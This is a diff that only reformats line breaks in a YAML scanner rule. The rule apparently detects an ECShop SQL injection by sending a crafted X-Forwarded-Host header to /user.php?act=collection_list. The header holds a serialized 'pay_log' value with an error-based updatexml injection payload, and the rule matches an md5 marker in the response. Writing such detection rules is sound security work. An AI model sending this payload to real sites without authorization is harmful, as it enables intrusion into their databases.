@@ -4,10 +4,12 @@ rules:
     path: /user.php?act=collection_list
     headers:
       X-Forwarded-Host: >-
-        45ea207d7a2b68c49582d2d22adf953apay_log|s:39:"1' and updatexml(1,md5(444444),1) and '";|
+        45ea207d7a2b68c49582d2d22adf953apay_log|s:39:"1' and
+        updatexml(1,md5(444444),1) and '";|
     follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(b"ab1fa529d7273da0db6b49cc4f3")
+    expression: >
+      response.status == 200 &&
+      response.body.bcontains(b"ab1fa529d7273da0db6b49cc4f3")
 detail:
   author: 曦s
   links: 
